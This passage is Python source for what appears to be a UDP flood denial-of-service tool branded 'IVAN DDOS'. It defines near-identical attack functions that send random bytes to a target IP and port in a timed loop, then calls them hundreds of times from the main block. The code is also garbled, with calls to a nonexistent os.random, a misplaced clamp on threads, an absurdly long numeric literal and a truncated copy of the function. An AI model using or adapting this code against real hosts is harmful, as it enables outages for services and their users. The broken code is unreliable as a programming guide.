    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

if __name__ == '__main__':
    try:
     if choice == 'UDP':
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
